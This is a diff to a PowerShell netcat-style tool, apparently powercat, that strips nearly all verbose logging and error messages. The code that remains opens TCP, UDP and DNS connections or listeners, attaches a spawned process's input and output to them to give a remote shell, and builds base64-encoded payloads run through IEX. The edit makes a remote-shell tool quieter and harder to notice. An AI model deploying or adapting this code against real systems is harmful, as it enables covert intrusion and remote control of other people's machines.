@@ -153,7 +153,6 @@ Examples:
       $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any), $p
       $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient $p
       $PacketInfo = New-Object System.Net.Sockets.IPPacketInformation
-      Write-Verbose ("Listening on [0.0.0.0] port " + $p + " [udp]")
       $ConnectHandle = $FuncVars["Socket"].Client.BeginReceiveMessageFrom($SocketDestinationBuffer,0,65536,[System.Net.Sockets.SocketFlags]::None,[ref]$EndPoint,$null,$null)
       $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
       while($True)
@@ -162,7 +161,6 @@ Examples:
         {
           if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp").VirtualKeyCode))
           {
-            Write-Verbose "CTRL or ESC caught. Stopping UDP Setup..."
             $FuncVars["Socket"].Close()
             $Stopwatch.Stop()
             break
@@ -172,12 +170,11 @@ Examples:
         {
           $FuncVars["Socket"].Close()
           $Stopwatch.Stop()
-          Write-Verbose "Timeout!" ; break
+          break
         }
         if($ConnectHandle.IsCompleted)
         {
           $SocketBytesRead = $FuncVars["Socket"].Client.EndReceiveMessageFrom($ConnectHandle,[ref]([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,[ref]$PacketInfo)
-          Write-Verbose ("Connection from [" + $EndPoint.Address.IPAddressToString + "] port " + $p + " [udp] accepted (source port " + $EndPoint.Port + ")")
           if($SocketBytesRead -gt 0){break}
           else{break}
         }
@@ -191,7 +188,6 @@ Examples:
       {
         $IPList = @()
         [System.Net.Dns]::GetHostAddresses($c) | Where-Object {$_.AddressFamily -eq "InterNetwork"} | %{$IPList += $_.IPAddressToString}
-        Write-Verbose ("Name " + $c + " resolved to address " + $IPList[0])
         $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPList[0])), $p
       }
       else
@@ -200,8 +196,6 @@ Examples:
       }
       $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient
       $FuncVars["Socket"].Connect($c,$p)
-      Write-Verbose ("Sending UDP traffic to " + $c + " port " + $p + "...")
-      Write-Verbose ("UDP: Make sure to send some data so the server can notice you!")
     }
     $FuncVars["BufferSize"] = 65536
     $FuncVars["EndPoint"] = $EndPoint
@@ -345,13 +339,11 @@ Examples:
     {
       $FuncVars["l"] = $False
       $Socket = New-Object System.Net.Sockets.TcpClient
-      Write-Verbose "Connecting..."
       $Handle = $Socket.BeginConnect($c,$p,$null,$null)
     }
     else
     {
       $FuncVars["l"] = $True
-      Write-Verbose ("Listening on [0.0.0.0] (port " + $p + ")")
       $Socket = New-Object System.Net.Sockets.TcpListener $p
       $Socket.Start()
       $Handle = $Socket.BeginAcceptTcpClient($null, $null)
@@ -364,7 +356,6 @@ Examples:
       {
         if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp").VirtualKeyCode))
         {
-          Write-Verbose "CTRL or ESC caught. Stopping TCP Setup..."
           if($FuncVars["l"]){$Socket.Stop()}
           else{$Socket.Close()}
           $Stopwatch.Stop()
@@ -376,7 +367,7 @@ Examples:
         if(!$l){$Socket.Close()}
         else{$Socket.Stop()}
         $Stopwatch.Stop()
-        Write-Verbose "Timeout!" ; break
+        break
         break
       }
       if($Handle.IsCompleted)
@@ -388,7 +379,6 @@ Examples:
             $Socket.EndConnect($Handle)
             $Stream = $Socket.GetStream()
             $BufferSize = $Socket.ReceiveBufferSize
-            Write-Verbose ("Connection to " + $c + ":" + $p + " [tcp] succeeded!")
           }
           catch{$Socket.Close(); $Stopwatch.Stop(); break}
         }
@@ -397,7 +387,6 @@ Examples:
           $Client = $Socket.EndAcceptTcpClient($Handle)
           $Stream = $Client.GetStream()
           $BufferSize = $Client.ReceiveBufferSize
-          Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
         }
         break
       }
@@ -456,7 +445,6 @@ Examples:
     $ProcessStartInfo.RedirectStandardOutput = $True
     $ProcessStartInfo.RedirectStandardError = $True
     $FuncVars["Process"] = [System.Diagnostics.Process]::Start($ProcessStartInfo)
-    Write-Verbose ("Starting Process " + $FuncSetupVars[0] + "...")
     $FuncVars["Process"].Start() | Out-Null
     $FuncVars["StdOutDestinationBuffer"] = New-Object System.Byte[] 65536
     $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
@@ -549,33 +537,28 @@ Examples:
       $Encoding = New-Object System.Text.AsciiEncoding
       if($i -ne $null)
       {
-        Write-Verbose "Input from -i detected..."
         if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
         elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
         elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
-        else{Write-Host "Unrecognised input type." ; return}
+        else{return}
       }
       
-      Write-Verbose "Setting up Stream 1..."
       try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
-      catch{Write-Verbose "Stream 1 Setup Failure" ; return}
-      
-      Write-Verbose "Setting up Stream 2..."
+      catch{return}
+	  
       try{$Stream2Vars = Stream2_Setup $Stream2SetupVars}
-      catch{Write-Verbose "Stream 2 Setup Failure" ; return}
+      catch{return}
       
       $Data = $null
       
       if($InputToWrite -ne @())
       {
-        Write-Verbose "Writing input to Stream 1..."
         try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
         catch{Write-Host "Failed to write input to Stream 1" ; return}
       }
       
-      if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
+      if($d){return}
       
-      Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
       while($True)
       {
         try
@@ -587,7 +570,7 @@ Examples:
         }
         catch
         {
-          Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
+          return
         }
         
         try
@@ -599,7 +582,7 @@ Examples:
         }
         catch
         {
-          Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
+          return
         }
       }
     }
@@ -607,21 +590,17 @@ Examples:
     {
       try
       {
-        #Write-Verbose "Closing Stream 2..."
         Stream2_Close $Stream2Vars
       }
       catch
       {
-        Write-Verbose "Failed to close Stream 2"
       }
       try
       {
-        #Write-Verbose "Closing Stream 1..."
         Stream1_Close $Stream1Vars
       }
       catch
       {
-        Write-Verbose "Failed to close Stream 1"
       }
     }
   }
@@ -630,7 +609,6 @@ Examples:
   ########## GENERATE PAYLOAD ##########
   if($u)
   {
-    Write-Verbose "Set Stream 1: UDP"
     $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
     $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
     $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
@@ -640,7 +618,6 @@ Examples:
   }
   elseif($dns -ne "")
   {
-    Write-Verbose "Set Stream 1: DNS"
     $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
     $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
     $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
@@ -650,7 +627,6 @@ Examples:
   }
   else
   {
-    Write-Verbose "Set Stream 1: TCP"
     $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
     $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
     $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
@@ -661,7 +637,6 @@ Examples:
   
   if($e -ne "")
   {
-    Write-Verbose "Set Stream 2: Process"
     $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_CMD} + "`n}`n`n")
     $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_CMD} + "`n}`n`n")
     $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_CMD} + "`n}`n`n")
@@ -670,14 +645,12 @@ Examples:
   }
   elseif($ep)
   {
-    Write-Verbose "Set Stream 2: Powershell"
     $InvokeString += "`n`n"
   }
   elseif($r -ne "")
   {
     if($r.split(":")[0].ToLower() -eq "udp")
     {
-      Write-Verbose "Set Stream 2: UDP"
       $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
       $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
       $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
@@ -688,7 +661,6 @@ Examples:
     }
     if($r.split(":")[0].ToLower() -eq "dns")
     {
-      Write-Verbose "Set Stream 2: DNS"
       $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
       $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
       $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
@@ -699,7 +671,6 @@ Examples:
     }
     elseif($r.split(":")[0].ToLower() -eq "tcp")
     {
-      Write-Verbose "Set Stream 2: TCP"
       $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
       $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
       $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
@@ -711,7 +682,6 @@ Examples:
   }
   else
   {
-    Write-Verbose "Set Stream 2: Console"
     $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_Console} + "`n}`n`n")
     $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_Console} + "`n}`n`n")
     $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_Console} + "`n}`n`n")
@@ -725,8 +695,8 @@ Examples:
   ########## GENERATE PAYLOAD ##########
   
   ########## RETURN GENERATED PAYLOADS ##########
-  if($ge){Write-Verbose "Returning Encoded Payload..." ; return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($InvokeString))}
-  elseif($g){Write-Verbose "Returning Payload..." ; return $InvokeString}
+  if($ge){return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($InvokeString))}
+  elseif($g){return $InvokeString}
   ########## RETURN GENERATED PAYLOADS ##########
   
   ########## EXECUTION ##########
@@ -739,7 +709,6 @@ Examples:
       {
         $Output += IEX $InvokeString
         Start-Sleep -s 2
-        Write-Verbose "Repetition Enabled: Restarting..."
       }
     }
     else
